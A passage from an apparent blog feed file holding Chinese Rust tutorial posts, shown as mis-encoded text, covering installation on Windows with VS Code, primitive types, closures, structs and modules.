å…è®¸ä½¿ç”¨ä»–ä»¬çš„å€¼è¾“å‡ºè¡¨è¾¾å¼çš„å€¼</li><li><code>compile_error!</code>: åœ¨ç¼–è¯‘æœŸä»ä»£ç ä¸­æŠ¥å‘Šé”™è¯¯.</li><li><code>concat!</code> é“¾æ¥ä¼ é€’ç»™å®ƒçš„ä»»æ„æ•°é‡çš„æ–‡å­—, å¹¶å°†é“¾æ¥çš„æ–‡å­—ä½œä¸º<code>&amp;'static str</code>è¿”å›</li><li><code>env!</code>: æ£€æŸ¥ç¼–è¯‘æœŸçš„ç¯å¢ƒå˜é‡, å®‰å…¨ç‰ˆæœ¬çš„å®ä¸º : <code>option_env!</code></li><li><code>eprint!</code>å’Œ<code>eprintln!</code> ä¸<code>println!</code>ç±»å‹, å°†æ¶ˆæ¯è¾“å‡ºåˆ°æ ‡å‡†å¼‚å¸¸æµä¸­</li><li><code>include_bytes!</code>: ä½œä¸ºä¸€ç§å°†æ–‡ä»¶è¯»å–ä¸ºå­—èŠ‚æ•°ç»„çš„å¿«æ·æ–¹å¼,</li><li><code>stringify!</code>: è·å¾—ç±»å‹æˆ–æ ‡è®°ä½œä¸ºå­—ç¬¦ä¸²çš„å­—é¢è½¬æ¢</li><li><code>vec!</code>:  vector</li></ul></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Rust </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rust </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rustå­¦ä¹ 1-å…¥é—¨</title>
      <link href="/posts/dba35a1e/"/>
      <url>/posts/dba35a1e/</url>
      
        <content type="html"><![CDATA[<h1>Rustå­¦ä¹ 1-å…¥é—¨</h1><h2 id="å®‰è£…Rust-VScodeé›†æˆRust">å®‰è£…Rust &amp;VScodeé›†æˆRust</h2><div class="story post-story"><p><strong>ç›®æ ‡:</strong></p><ul><li><p>windows ç¯å¢ƒä¸‹ä½¿ç”¨VScode IDE è¿›è¡Œrustç¼–å†™å’Œæµ‹è¯•è¿è¡Œ</p></li><li><p>VScodeé›†æˆrust</p></li></ul><h3 id="windows-å®‰è£…Rust">windows å®‰è£…Rust</h3><blockquote><p>It looks like youâ€™re running Windows. To start using Rust, download the installer, then run the program and follow the onscreen instructions. You may need to install the <a href="https://visualstudio.microsoft.com/visual-cpp-build-tools/">Visual Studio C++ Build tools</a> when prompted to do so. If you are not on Windows see <a href="https://forge.rust-lang.org/infra/other-installation-methods.html">â€œOther Installation Methodsâ€</a>.</p></blockquote><ol><li><p>å®‰è£… Visual Studio 2019 çš„æ„å»ºå·¥å…·</p><p><a href="https://visualstudio.microsoft.com/visual-cpp-build-tools/">https://visualstudio.microsoft.com/visual-cpp-build-tools/</a></p><p>è¯­è¨€åŒ…: é€‰æ‹©ä¸­æ–‡å’Œè‹±æ–‡</p><p><img src="https://s2.loli.net/2022/02/03/xDuwtvKPmhrpsNg.png" class="lazyload" data-srcset="https://s2.loli.net/2022/02/03/xDuwtvKPmhrpsNg.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220203173414217"></p></li><li><p>å®‰è£…rust</p><p><a href="https://www.rust-lang.org/tools/install">https://www.rust-lang.org/tools/install</a> é€‰æ‹©64ä½</p><p>é»˜è®¤å®‰è£…å³å¯</p></li><li><p>æµ‹è¯•æ˜¯å¦å®‰è£…æˆåŠŸ:</p><pre class="language-shell" data-language="shell"><code class="language-shell">$ cargo --versioncargo <span class="token number">1.58</span>.0 <span class="token punctuation">(</span>f01b232bc <span class="token number">2022</span>-01-19<span class="token punctuation">)</span></code></pre></li></ol><h3 id="VSCodeé›†æˆrust">VSCodeé›†æˆrust</h3><ol><li><p>å®‰è£…<code>Rust and Friends</code> é›†æˆåŒ…</p><p><img src="https://s2.loli.net/2022/02/03/VZbG5ERQP1iv9ND.png" class="lazyload" data-srcset="https://s2.loli.net/2022/02/03/VZbG5ERQP1iv9ND.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220203173823339"></p></li><li><p>é›†æˆåŒ…ä¸­åŒ…æ‹¬: <code>rust-analyzer</code></p><p>ä½¿ç”¨rust-analyzer è¿›è¡Œç¼–è¯‘è¿è¡Œ</p></li></ol></div><h2 id="Rustè¯­è¨€">Rustè¯­è¨€</h2><div class="story post-story"><h3 id="åŸºå…ƒç±»å‹">åŸºå…ƒç±»å‹</h3><p>bool,char</p><p>æ•´å‹ æœ€å¤§æ”¯æŒ128ä½</p><table><thead><tr><th>æœ‰ç¬¦å·</th><th>æ— ç¬¦å·</th></tr></thead><tbody><tr><td>i8</td><td>u8</td></tr><tr><td>i16</td><td>u16</td></tr><tr><td>i32</td><td>u32</td></tr><tr><td>i64</td><td>u64</td></tr><tr><td>i126</td><td>u128</td></tr></tbody></table><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>isize</td><td>å°ºå¯¸å¯å˜çš„æœ‰ç¬¦å·æ•´å‹</td></tr><tr><td>usize</td><td>å°ºå¯¸å¯å˜çš„æ— ç¬¦å·æ•´å‹</td></tr><tr><td>f32</td><td>32ä½æµ®ç‚¹æ•°</td></tr><tr><td>f64</td><td>64ä½æµ®ç‚¹æ•°</td></tr><tr><td>[T,N]</td><td>å›ºå®šå¤§å°çš„æ•°ç»„, Tå…ƒç´ ç±»å‹,Næ•°ç»„å¤§å°</td></tr><tr><td>[T]</td><td>åŠ¨æ€å¤§å°çš„è¿ç»­åºåˆ—çš„è§†å›¾,Tä»»æ„ç±»å‹</td></tr><tr><td>str</td><td>å­—ç¬¦ä¸²åˆ‡ç‰‡,ä¸»è¦åšå¼•ç”¨, å³<code>&amp;str</code></td></tr><tr><td>(T,U,â€¦)</td><td>æœ‰é™åºåˆ—,T,Uä¸ºä¸åŒç±»å‹</td></tr><tr><td>fn(i32) -&gt; i32</td><td>æ¥å—i32ç±»å‹å‚æ•°å¹¶è¿”å›i32ç±»å‹å‚æ•°çš„å‡½æ•°</td></tr></tbody></table><h3 id="å˜é‡å£°æ˜å’Œä¸å¯å˜æ€§">å˜é‡å£°æ˜å’Œä¸å¯å˜æ€§</h3><p>ä½¿ç”¨å…³é”®å­—<code>let</code>å£°æ˜å˜é‡, å˜é‡åˆå§‹,æ— æ³•åˆ†é…å…¶ä»–å€¼,è‹¥è¦ä¿®æ”¹,åˆ™å‰é¢æ·»åŠ <code>mut</code>å…³é”®å­—</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    a <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    b <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>    <span class="token macro property">print!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;,&#123;&#125;"</span><span class="token punctuation">,</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>æŠ¥é”™.</p><p><img src="https://s2.loli.net/2022/02/03/s3OaXJ6Igdt7QbD.png" class="lazyload" data-srcset="https://s2.loli.net/2022/02/03/s3OaXJ6Igdt7QbD.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220203152052669"></p><h3 id="å‡½æ•°">å‡½æ•°</h3><p>å‡½æ•°è¡¨ç¤º:</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token punctuation">(</span><span class="token keyword">u64</span><span class="token punctuation">,</span><span class="token keyword">u64</span><span class="token punctuation">)</span> <span class="token punctuation">-></span><span class="token keyword">u64</span></code></pre><h3 id="é—­åŒ…">é—­åŒ…</h3><p>ç®€å•é—­åŒ…, é€šè¿‡aæ¥è°ƒç”¨, <code>||</code>å†…å­˜æ”¾å‚æ•°</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token closure-params"><span class="token closure-punctuation punctuation">|</span><span class="token closure-punctuation punctuation">|</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>å®ä¾‹:</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> double <span class="token operator">=</span> <span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>x<span class="token closure-punctuation punctuation">|</span></span> x<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> value <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> twice <span class="token operator">=</span> <span class="token function">double</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> big_c <span class="token operator">=</span> <span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>b<span class="token punctuation">,</span>c<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> z <span class="token operator">=</span> b<span class="token operator">+</span>c<span class="token punctuation">;</span>        z <span class="token operator">*</span> twice    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> some <span class="token operator">=</span> <span class="token function">big_c</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">print!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span>some<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>     <span class="token class-name">Running</span> `target\debug\helloworld<span class="token punctuation">.</span>exe`<span class="token number">30</span></code></pre><h3 id="å­—ç¬¦ä¸²">å­—ç¬¦ä¸²</h3><p><code>&amp;str</code>, <code>String</code> ä¸¤ç§ç±»å‹, ä¿è¯å­—ç¬¦ä¸²ä¸ºæœ‰æ•ˆçš„UTF-8</p><h3 id="æ¡ä»¶å’Œåˆ¤æ–­">æ¡ä»¶å’Œåˆ¤æ–­</h3><p>ç±»ä¼¼ C++ if-else</p><p>ä½†Rustçš„if-else ä¸æ˜¯è¯­å¥,è€Œæ˜¯ä¸€ä¸ªè¡¨è¾¾å¼,è¡¨è¾¾å¼ä¼šè¿”å›å€¼</p><p>èŠ±æ‹¬å·æœ€åä¸€è¡Œæˆä¸ºè¡¨è¾¾å¼çš„è¿”å›å€¼, if-elseåˆ†æ”¯åº”å…·æœ‰ç›¸åŒçš„è¿”å›ç±»å‹</p><h3 id="match-è¡¨è¾¾å¼">match è¡¨è¾¾å¼</h3><p>ç±»ä¼¼äºcè¯­è¨€<code>switch</code>è¯­å¥</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    math a <span class="token punctuation">&#123;</span>        b <span class="token operator">=></span> <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"b"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        c <span class="token operator">=></span> <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"c"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        other <span class="token operator">=></span><span class="token punctuation">&#123;</span>            xxxx<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="å¾ªç¯">å¾ªç¯</h3><p><code>loop</code>,<code>while</code>,<code>for</code></p><p>loop æ— é™å¾ªç¯ break è·³å‡º</p><p>rustä¸­çš„<code>for</code> å¾ªç¯åªé€‚ç”¨ç”¨å¯ä»¥è½¬æ¢ä¸ºè¿­ä»£å™¨çš„ç±»å‹</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span><span class="token number">10</span><span class="token punctuation">&#123;</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 0..10  0-10 ä¸åŒ…æ‹¬10 </span><span class="token comment">// 0..=10 0-10 åŒ…æ‹¬10</span></code></pre><h3 id="ç»“æ„ä½“">ç»“æ„ä½“</h3><p>Rustç»“æ„ä½“ç±»ä¼¼Cè¯­è¨€ç»“æ„ä½“</p><p>Rust ä¸­çš„ç»“æ„ä½“ï¼ˆStructï¼‰ä¸å…ƒç»„ï¼ˆTupleï¼‰éƒ½å¯ä»¥å°†è‹¥å¹²ä¸ªç±»å‹ä¸ä¸€å®šç›¸åŒçš„æ•°æ®æ†ç»‘åœ¨ä¸€èµ·å½¢æˆæ•´ä½“ï¼Œä½†ç»“æ„ä½“çš„æ¯ä¸ªæˆå‘˜å’Œå…¶æœ¬èº«éƒ½æœ‰ä¸€ä¸ªåå­—ï¼Œè¿™æ ·è®¿é—®å®ƒæˆå‘˜çš„æ—¶å€™å°±ä¸ç”¨è®°ä½ä¸‹æ ‡äº†ã€‚å…ƒç»„å¸¸ç”¨äºéå®šä¹‰çš„å¤šå€¼ä¼ é€’ï¼Œè€Œç»“æ„ä½“ç”¨äºè§„èŒƒå¸¸ç”¨çš„æ•°æ®ç»“æ„ã€‚ç»“æ„ä½“çš„æ¯ä¸ªæˆå‘˜å«åš&quot;å­—æ®µ&quot;ã€‚</p><p>è¿™æ˜¯ä¸€ä¸ªç»“æ„ä½“å®šä¹‰ï¼š</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">struct</span> <span class="token type-definition class-name">Site</span> <span class="token punctuation">&#123;</span>    domain<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span>    name<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span>    nation<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span>    found<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">&#125;</span></code></pre><p>æ³¨æ„ï¼šå¦‚æœä½ å¸¸ç”¨ C/C++ï¼Œè¯·è®°ä½åœ¨ Rust é‡Œ struct è¯­å¥ä»…ç”¨æ¥å®šä¹‰ï¼Œä¸èƒ½å£°æ˜å®ä¾‹ï¼Œç»“å°¾ä¸éœ€è¦ <strong>;</strong> ç¬¦å·ï¼Œè€Œä¸”æ¯ä¸ªå­—æ®µå®šä¹‰ä¹‹åç”¨ <strong>,</strong> åˆ†éš”ã€‚</p><p>æœ‰ä¸€ç§æ›´ç®€å•çš„å®šä¹‰å’Œä½¿ç”¨ç»“æ„ä½“çš„æ–¹å¼ï¼š<strong>å…ƒç»„ç»“æ„ä½“</strong>ã€‚</p><p>å…ƒç»„ç»“æ„ä½“æ˜¯ä¸€ç§å½¢å¼æ˜¯å…ƒç»„çš„ç»“æ„ä½“ã€‚</p><p>ä¸å…ƒç»„çš„åŒºåˆ«æ˜¯å®ƒæœ‰åå­—å’Œå›ºå®šçš„ç±»å‹æ ¼å¼ã€‚å®ƒå­˜åœ¨çš„æ„ä¹‰æ˜¯ä¸ºäº†å¤„ç†é‚£äº›éœ€è¦å®šä¹‰ç±»å‹ï¼ˆç»å¸¸ä½¿ç”¨ï¼‰åˆä¸æƒ³å¤ªå¤æ‚çš„ç®€å•æ•°æ®ï¼š</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">struct</span> <span class="token type-definition class-name">Color</span><span class="token punctuation">(</span><span class="token keyword">u8</span><span class="token punctuation">,</span> <span class="token keyword">u8</span><span class="token punctuation">,</span> <span class="token keyword">u8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token type-definition class-name">Point</span><span class="token punctuation">(</span><span class="token keyword">f64</span><span class="token punctuation">,</span> <span class="token keyword">f64</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> black <span class="token operator">=</span> <span class="token class-name">Color</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> origin <span class="token operator">=</span> <span class="token class-name">Point</span><span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">0.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>&quot;é¢œè‰²&quot;å’Œ&quot;ç‚¹åæ ‡&quot;æ˜¯å¸¸ç”¨çš„ä¸¤ç§æ•°æ®ç±»å‹ï¼Œä½†å¦‚æœå®ä¾‹åŒ–æ—¶å†™ä¸ªå¤§æ‹¬å·å†å†™ä¸Šä¸¤ä¸ªåå­—å°±ä¸ºäº†å¯è¯»æ€§ç‰ºç‰²äº†ä¾¿æ·æ€§ï¼ŒRust ä¸ä¼šé—ç•™è¿™ä¸ªé—®é¢˜ã€‚å…ƒç»„ç»“æ„ä½“å¯¹è±¡çš„ä½¿ç”¨æ–¹å¼å’Œå…ƒç»„ä¸€æ ·ï¼Œé€šè¿‡ . å’Œä¸‹æ ‡æ¥è¿›è¡Œè®¿é—®ï¼š</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token type-definition class-name">Color</span><span class="token punctuation">(</span><span class="token keyword">u8</span><span class="token punctuation">,</span> <span class="token keyword">u8</span><span class="token punctuation">,</span> <span class="token keyword">u8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token type-definition class-name">Point</span><span class="token punctuation">(</span><span class="token keyword">f64</span><span class="token punctuation">,</span> <span class="token keyword">f64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> black <span class="token operator">=</span> <span class="token class-name">Color</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> origin <span class="token operator">=</span> <span class="token class-name">Point</span><span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">0.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"black = (&#123;&#125;, &#123;&#125;, &#123;&#125;)"</span><span class="token punctuation">,</span> black<span class="token number">.0</span><span class="token punctuation">,</span> black<span class="token number">.1</span><span class="token punctuation">,</span> black<span class="token number">.2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"origin = (&#123;&#125;, &#123;&#125;)"</span><span class="token punctuation">,</span> origin<span class="token number">.0</span><span class="token punctuation">,</span> origin<span class="token number">.1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>Rust è¯­è¨€ä¸æ˜¯é¢å‘å¯¹è±¡çš„ï¼Œä»å®ƒæ‰€æœ‰æƒæœºåˆ¶çš„åˆ›æ–°å¯ä»¥çœ‹å‡ºè¿™ä¸€ç‚¹ã€‚ä½†æ˜¯é¢å‘å¯¹è±¡çš„çè´µæ€æƒ³å¯ä»¥åœ¨ Rust å®ç°ã€‚</p><p>ç»“æ„ä½“æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»æ˜¯ <code>&amp;self</code>ï¼Œä¸éœ€å£°æ˜ç±»å‹ï¼Œå› ä¸º <code>self </code>ä¸æ˜¯ä¸€ç§é£æ ¼è€Œæ˜¯å…³é”®å­—ã€‚</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">struct</span> <span class="token type-definition class-name">Rectangle</span> <span class="token punctuation">&#123;</span>    width<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span>    height<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">impl</span> <span class="token class-name">Rectangle</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">output</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">u32</span><span class="token punctuation">&#123;</span>        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;,"</span><span class="token punctuation">,</span><span class="token keyword">self</span><span class="token punctuation">.</span>width <span class="token operator">*</span> <span class="token keyword">self</span><span class="token punctuation">.</span>height<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">self</span><span class="token punctuation">.</span>height <span class="token operator">+</span> <span class="token keyword">self</span><span class="token punctuation">.</span>width    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> rect1 <span class="token operator">=</span> <span class="token class-name">Rectangle</span> <span class="token punctuation">&#123;</span> width<span class="token punctuation">:</span> <span class="token number">30</span><span class="token punctuation">,</span> height<span class="token punctuation">:</span> <span class="token number">50</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token class-name">Rectangle</span><span class="token punctuation">::</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rect1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"rect.1è°ƒç”¨&#123;&#125;"</span><span class="token punctuation">,</span>rect1<span class="token punctuation">.</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>è¾“å‡º<span class="token punctuation">:</span><span class="token number">1500</span><span class="token punctuation">,</span><span class="token number">1500</span><span class="token punctuation">,</span>rect<span class="token number">.1</span>è°ƒç”¨<span class="token number">80</span></code></pre><ul><li><code>self</code> è°ƒç”¨æ­¤æ–¹æ³•å,ä¸å…è®¸åç»­ä½¿ç”¨è¯¥ç±»å‹</li><li><code>&amp;self</code> ç±»å‹å®ä¾‹çš„è¯»å–è®¿é—®æƒé™</li><li><code>&amp;mut self</code> ç±»å‹å®ä¾‹çš„å¯å˜è®¿é—®</li></ul><h3 id="module-import-use">module,import,use</h3><p>æ¨¡å—</p><ul><li>æ¯ä¸ªrustç¨‹åºéƒ½éœ€è¦rootæ¨¡å—, å¯æ‰§è¡Œæ–‡ä»¶,<a href="http://xn--main-uh5f306f8z3f.rs">é€šå¸¸ä¸ºmain.rs</a>, å¯¹äºç¨‹åºåº“,<a href="http://xn--lib-c88d344een2e.rs">é€šå¸¸ä¸ºlib.rs</a></li><li>æ¨¡å—å¯ä»¥åœ¨å…¶ä»–æ¨¡å—å†…éƒ¨å£°æ˜,ä¹Ÿå¯ä»¥ç»„ç»‡ä¸ºæ–‡ä»¶å’Œç›®å½•</li><li>ä½¿ç”¨<code>mod</code>å£°æ˜, ä½¿ç”¨<code>use</code>å¼•ç”¨</li><li>æ¨¡å—ä¸­å®šä¹‰çš„å…ƒç´ é»˜è®¤ä¸ºç§æœ‰çš„, ä½¿ç”¨<code>pub</code> å…¬å…±è®¿é—®</li></ul><p>Rust ä¸­æœ‰ä¸¤ç§ç®€å•çš„è®¿é—®æƒï¼šå…¬å…±ï¼ˆpublicï¼‰å’Œç§æœ‰ï¼ˆprivateï¼‰ã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœä¸åŠ ä¿®é¥°ç¬¦ï¼Œæ¨¡å—ä¸­çš„æˆå‘˜è®¿é—®æƒå°†æ˜¯ç§æœ‰çš„ã€‚</p><p>å¦‚æœæƒ³ä½¿ç”¨å…¬å…±æƒé™ï¼Œéœ€è¦ä½¿ç”¨ pub å…³é”®å­—ã€‚</p><p>å¯¹äºç§æœ‰çš„æ¨¡å—ï¼Œåªæœ‰åœ¨ä¸å…¶å¹³çº§çš„ä½ç½®æˆ–ä¸‹çº§çš„ä½ç½®æ‰èƒ½è®¿é—®ï¼Œä¸èƒ½ä»å…¶å¤–éƒ¨è®¿é—®ã€‚</p><p>use å…³é”®å­—èƒ½å¤Ÿå°†æ¨¡å—æ ‡è¯†ç¬¦å¼•å…¥å½“å‰ä½œç”¨åŸŸï¼š</p><p>å½“å­˜åœ¨ä¸¤ä¸ªç›¸åŒçš„åç§°ï¼Œä¸”åŒæ ·éœ€è¦å¯¼å…¥ï¼Œå¯ä»¥ä½¿ç”¨ as å…³é”®å­—ä¸ºæ ‡è¯†ç¬¦æ·»åŠ åˆ«åï¼š</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">mod</span> <span class="token module-declaration namespace">nation</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">pub</span> <span class="token keyword">mod</span> <span class="token module-declaration namespace">government</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">govern</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">govern</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>   <span class="token keyword">use</span> <span class="token keyword">crate</span><span class="token module-declaration namespace"><span class="token punctuation">::</span>nation<span class="token punctuation">::</span>government<span class="token punctuation">::</span></span>govern<span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token keyword">crate</span><span class="token module-declaration namespace"><span class="token punctuation">::</span>nation<span class="token punctuation">::</span></span>govern <span class="token keyword">as</span> nation_govern<span class="token punctuation">;</span><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">nation_govern</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">govern</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>use å…³é”®å­—å¯ä»¥ä¸ pub å…³é”®å­—é…åˆä½¿ç”¨ï¼š</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">mod</span> <span class="token module-declaration namespace">nation</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">pub</span> <span class="token keyword">mod</span> <span class="token module-declaration namespace">government</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">govern</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">pub</span> <span class="token keyword">use</span> <span class="token namespace">government<span class="token punctuation">::</span></span>govern<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token namespace">nation<span class="token punctuation">::</span></span><span class="token function">govern</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="æ•°ç»„-å…ƒç»„-é¡¹ç›®åˆ—è¡¨">æ•°ç»„,å…ƒç»„,é¡¹ç›®åˆ—è¡¨</h3><p>æ•°ç»„å…·æœ‰å›ºå®šé•¿åº¦, å­˜å‚¨ç›¸åŒç±»å‹å…ƒç´ , æ•°ç»„å¤§å°å¿…é¡»æ˜¯<code>usize</code>ç¡®å®šå€¼,ä¸èƒ½æ˜¯å˜é‡</p><p>å…ƒç»„å¯ä»¥æ˜¯ä¸åŒç±»å‹, å…ƒç»„æ˜¯å¼‚æ„é›†åˆ,</p><p>é¡¹ç›®åˆ—è¡¨:  ç±»ä¼¼æ•°ç»„, ä½†å†…å®¹å’Œé•¿åº¦å¯ä»¥ä¸ç”¨äº‹å…ˆæŒ‡å®š; ä»å †ä¸Šåˆ†é…,ä½¿ç”¨<code>Vec::new</code> æ„é€ æˆ– å®<code>vec![]</code>åˆ›å»º</p><pre class="language-rust" data-language="rust"><code class="language-rust">    <span class="token keyword">let</span> <span class="token 